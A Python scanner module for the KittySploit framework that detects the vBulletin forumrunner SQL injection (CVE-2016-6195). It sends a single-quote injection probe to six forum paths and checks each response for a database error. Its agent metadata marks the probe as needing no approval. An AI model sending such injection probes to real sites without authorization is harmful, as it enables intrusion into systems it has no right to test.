#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vBulletin versions 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'vBulletin <= 4.2.3 - SQL Injection Detection',
        'description': 'vBulletin versions 3.6.0 through 4.2.3 are vulnerable to an SQL injection vulnerability in the vBulletin core forumrunner addon. The vulnerability allows an attacker to execute arbitrary SQL queries and potentially access sensitive information from the database.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2016', 'vbulletin', 'sqli', 'forum', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 6,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.cvedetails.com/cve/CVE-2016-6195/',
            'https://www.exploit-db.com/exploits/38489',
            'https://enumerated.wordpress.com/2016/07/11/1/',
            'http://www.vbulletin.org/forum/showthread.php?t=322848',
            'https://github.com/drewlong/vbully',
        ],
        'cve': 'CVE-2016-6195',
    }

    def run(self):
        for path in ('/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27', '/boards/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27', '/board/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27', '/forum/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27', '/forums/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27', '/vb/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27'):
            r = self.http_request(method="GET", path=path, allow_redirects=True)
            if not r or r.status_code not in (200, 503):
                continue
            body = r.text or ""
            body_any = ('type=dberror',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='critical',
                    reason="vBulletin <= 4.2.3 - SQL Injection detected",
                    path=path,
                )
                return True
        return False

